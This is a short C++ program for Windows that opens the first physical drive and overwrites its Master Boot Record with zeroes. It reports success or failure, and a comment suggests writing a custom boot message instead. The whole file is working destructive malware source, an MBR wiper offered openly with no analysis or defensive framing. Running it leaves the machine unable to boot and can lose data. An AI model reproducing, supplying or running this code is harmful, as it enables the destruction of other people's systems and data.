// Author : Nemuel Wainaina

#include <iostream>
#include <Windows.h>

#define MBR_SIZE 512 // the MBR is only 512 Bytes in size
#define bzero(p, s) (void) memset(p, 0, s) // Reset all bytes to zero

/*
    You can customize what you will overwrite the MBR with, 
    such as displaying a custom message on Windows boot
    In this program, am simply overwriting the entire MBR with zeroes
*/

using namespace std;

int main()
{
    DWORD write;
    char mbrData[MBR_SIZE];
    bzero(&mbrData, MBR_SIZE);
    HANDLE MBR = CreateFile(
        L"\\\\.\\PhysicalDrive0",
        GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        NULL,
        NULL
    );
    if (WriteFile(MBR, mbrData, MBR_SIZE, &write, NULL) == TRUE) {
        // success
        cout << "[!] MBR OverWritten Successfully !";
    }
    else {
        // failed
        cout << "[-] MBR OverWrite Failed !";
    }
    CloseHandle(MBR);
    return EXIT_SUCCESS;
}